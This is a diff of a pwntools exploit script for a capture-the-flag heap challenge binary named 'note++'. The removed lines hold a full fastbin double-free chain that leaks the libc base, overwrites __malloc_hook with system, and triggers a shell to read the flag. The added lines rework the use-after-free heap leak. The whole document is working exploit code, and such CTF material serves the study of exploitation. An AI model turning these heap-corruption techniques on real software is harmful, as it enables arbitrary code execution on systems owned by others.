@@ -8,60 +8,40 @@ context.clear(arch='x86_64')
 r = process('./note++')
 libc = ELF('./libc.so', checksec=False)
 
+
+note_cnt = 0
 def add(size, note, description):
     r.sendafter('>', '1')
     r.sendafter('Size: ', str(size))
     r.sendafter('Note: ', note)
     r.sendafter('note: ', description)
 
-def show(idx):
+    global note_cnt
+    note_cnt += 1
+    return note_cnt - 1
+
+def show():
     r.sendafter('>', '2')
-    r.send(str(idx))
+    recv_list = r.recvuntil('\x90').split('\n')
+    print(recv_list)
 
 def delete(idx):
     r.sendafter('>', '3')
     r.sendafter('Index: ', str(idx))
 
-add(0x68, '\x87' * 4, '\x87' * 48) # note 0
-add(0x68, '\x88' * 4, '\x87' * 48) # note 1, to avoid merging with top chunk
-add(0x68, '\x89' * 4, '\x87' * 48) # note 2, another fastbin size for fastbin 1, 2, 1 attack
-pause()
 
-# exploit UAF to do information leak
-r.interactive()
-delete(0)
-show(0)
-print('listnote --> ', r.recv())
+# UAF: create 2 fastbin for leaking heap address
+a = add(0x0, '\x61' * 0x5, '\x87' * 47 + '\x88' * 1) # note 0
+b = add(0x0, '\x61' * 0x5, '\x89' * 47 + '\x90' * 1) # note 1
+pause()
+delete(a)
+delete(b)
+pause()
+a = add(0x0, '\x61' * 0x5, '\x91' * 47 + '\x92' * 1) # note 0
+b = add(0x0, '\x61' * 0x5, '\x93' * 47 + '\x94' * 1) # note 1
+show()
 exit()
 
 libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
 print('libc_base --> ', hex(libc_base))
-
 # create fastbin attack, for fake chunk
-delete(1)
-delete(2)
-delete(1)
-
-libc = ELF('./libc-2.23.so')
-exit(0)
-
-# send some malicious payload to it
-# why 0x10 - 3??: to make system check for legel chunk (flag ok, size ok, can same size with 0x70 series)
-add(0x68, p64(libc_base + libc.sym.__malloc_hook - 0x10 - 3))
-print('write fake')
-add(0x68, '\x87') # 0x68 is in the same series of 0x70 series
-print('take 1')
-add(0x68, '\x88') # 0x68 is in the same series of 0x70 series
-print('take 2')
-
-
-# malloc a fake chunk in it
-add(0x68, '\x99\x99\x99' + p64(libc_base + libc.sym.system)) # overwrite __malloc_hook as system
-print('overwrite __malloc_hook')
-
-r.sendafter('>', '1')
-r.sendafter('Size: ', str(libc_base + libc.search('/bin/sh').next()))
-
-r.sendline('cat /home/`whoami`/flag')
-print('FLAG --> ', r.recvuntil('}'))
-r.close()
